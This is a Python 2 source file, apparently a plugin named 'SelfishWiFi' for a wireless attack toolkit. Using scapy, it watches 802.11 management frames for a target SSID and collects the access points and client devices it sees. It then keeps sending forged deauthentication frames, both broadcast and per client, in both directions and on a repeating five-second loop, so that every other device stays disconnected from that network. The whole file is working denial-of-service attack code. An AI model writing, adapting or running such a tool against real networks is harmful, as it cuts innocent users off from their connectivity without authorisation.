
from AuxiliaryModules.packet import ClientPacket, AccessPointPacket
from plugin import AirScannerPlugin
from utils.networkmanager import NetworkCard
from scapy.all import 	RadioTap, Dot11, Dot11Auth, Dot11Deauth, Dot11ProbeReq, Dot11ProbeResp, \
						Dot11AssoReq, Dot11AssoResp, Dot11ReassoReq, Dot11ReassoResp, sendp
from socket import error as socket_error
from time import sleep
from threading import Thread

class SelfishWiFi(AirScannerPlugin):

	def __init__(self, ssid, running_interface, internet_interface, ignore_clients = []):
		super(SelfishWiFi, self).__init__()
		self.running_interface = running_interface
		self.ignore_clients = ignore_clients + ["ff:ff:ff:ff:ff:ff"]
		internet_interface_mac = NetworkCard(internet_interface).get_mac()
		if internet_interface_mac is not None:
			self.ignore_clients.append(internet_interface_mac)

		self.is_running = True
		self.general_deauth_attack_completed = False
		self.deauth_ssid = ssid
		self.deauth_bssids = set()
		self.clients_to_deauth = set()

		self.periodic_deauthenticator = Thread(target = self.periodic_attack)
		self.periodic_deauthenticator.start()


	def craft_deauth_packets(self, client_mac, ap_bssid):
		# Craft Deauthentication packets with multiple reason codes
		deauthentication_packets = []
		for reason_code in range(6, 20):
			deauth_packet1 =	RadioTap() / \
								Dot11(type=0,subtype=12, addr1=ap_bssid, addr2=client_mac, addr3=client_mac) / \
								Dot11Deauth(reason=reason_code)
			deauth_packet2 =	RadioTap() / \
								Dot11(type=0,subtype=12, addr1=client_mac, addr2=ap_bssid, addr3=ap_bssid) / \
								Dot11Deauth(reason=reason_code)

			deauthentication_packets.append(deauth_packet1)
			deauthentication_packets.append(deauth_packet2)
		return deauthentication_packets

	def deauthentication_attack(self, deauth_packets):
		try:
			for packet in deauth_packets:
				sendp(packet, iface = self.running_interface, count = 1, inter = 0.1, verbose=0)
		except socket_error as e:
			if not e.errno == 100:
				print e
				traceback.print_exc()
		except Exception as e:
			print "Exception: {}".format(e)
			print "[-] Stopping deauthentication."

	def general_deauth_attack(self, bssid):
		deauth_packets = self.craft_deauth_packets("FF:FF:FF:FF:FF:FF", bssid)
		self.deauthentication_attack(deauth_packets)

	def reactive_attack(self, client_mac, bssid):
		deauth_packets = self.craft_deauth_packets(client_mac, bssid)
		self.deauthentication_attack(deauth_packets)

	def periodic_attack(self):
		while self.is_running:
			try:
				for bssid in self.deauth_bssids:
					for client in self.clients_to_deauth:
						print "[+] Periodic attack on {} vs {}".format(client, self.deauth_ssid)
						self.reactive_attack(client, bssid)
			except:
				#Set sizes are likely to change and this raises exceptions
				#I know how and that I can use locks, but this will lock the resource for too long
				#This little hack ignores the exception and the attack starts over.
				pass
			sleep(5)

	def restore(self):
		self.is_running = False

	def handle_packet(self, packet):
		parsed_packet = None

		if 	(Dot11ProbeReq in packet) or \
			(Dot11AssoReq in packet) or \
			(Dot11ReassoReq in packet) or \
			(Dot11Auth in packet and packet[Dot11Auth].status):

			parsed_packet = ClientPacket(packet)

		elif (Dot11ProbeResp in packet) or \
			 (Dot11AssoResp in packet) or \
			 (Dot11ReassoResp in packet) or \
			 (Dot11Auth in packet and not packet[Dot11Auth].status):

			parsed_packet = AccessPointPacket(packet)

		
		if 	parsed_packet is not None and \
			parsed_packet.client_mac not in self.ignore_clients and \
			parsed_packet.client_mac not in self.deauth_bssids and \
			parsed_packet.ssid == self.deauth_ssid:

			# When multiple access points have same ssid they are deauthed and logged
			if parsed_packet.bssid not in self.deauth_bssids:
				print "[+] Adding '{}' to the access points to deauthenticate list.".format(parsed_packet.bssid)
				print "[+] Initial general Deauthentication attack on {}({}) started".format(self.deauth_ssid, 
																							 parsed_packet.bssid)
				self.general_deauth_attack(parsed_packet.bssid)
				self.general_deauth_attack_completed = True
				print "[+] General Deauthentication attack on {}({}) finished".format(	self.deauth_ssid, 
																						parsed_packet.bssid)

			# Sets don't duplicate, no need to check
			self.deauth_bssids.add(parsed_packet.bssid)
			if parsed_packet.client_mac not in self.deauth_bssids: # May have parsed client as bssid
				self.clients_to_deauth.add(parsed_packet.client_mac)

			print "[+] Saw a {packet} packet from {ssid} to {mac}({vendor})".format(packet = parsed_packet.__class__.__name__,
																					mac = parsed_packet.client_mac,
																					vendor = parsed_packet.client_vendor,
																					ssid = parsed_packet.ssid)

			print "[+] Breaking up {mac}({vendor}) and {ssid}".format(	mac = parsed_packet.client_mac,
																		vendor = parsed_packet.client_vendor,
																		ssid = parsed_packet.ssid)
			self.reactive_attack(parsed_packet.client_mac, parsed_packet.bssid)
